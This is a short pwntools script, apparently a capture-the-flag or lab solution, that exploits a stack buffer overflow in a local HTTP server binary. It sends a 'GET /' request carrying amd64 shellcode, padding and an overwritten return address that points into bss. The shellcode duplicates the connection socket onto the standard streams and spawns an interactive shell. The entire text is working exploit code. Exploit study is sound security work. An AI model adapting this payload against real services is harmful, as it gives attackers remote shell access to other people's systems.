from pwn import *

r = remote("127.0.0.1", 8001)
e = ELF('./server.out')

# bss
bss = e.bss()
req_path = bss + 144 + 256
sockfd = bss + 144 + 256 + 128 + 8 + 8

# shellcode
s = f"""
mov rsi, 2
mov rdi, [{sockfd}]
dup2:
mov rax, 33
syscall
dec rsi
jns dup2
""" + shellcraft.amd64.sh()

# payload
p = b"GET /" + asm(s, arch='amd64')
p += (1000 - len(p) + 8) * b'p'  # padding
p += p64(req_path + 2) # return address

r.sendline(p)
r.interactive()
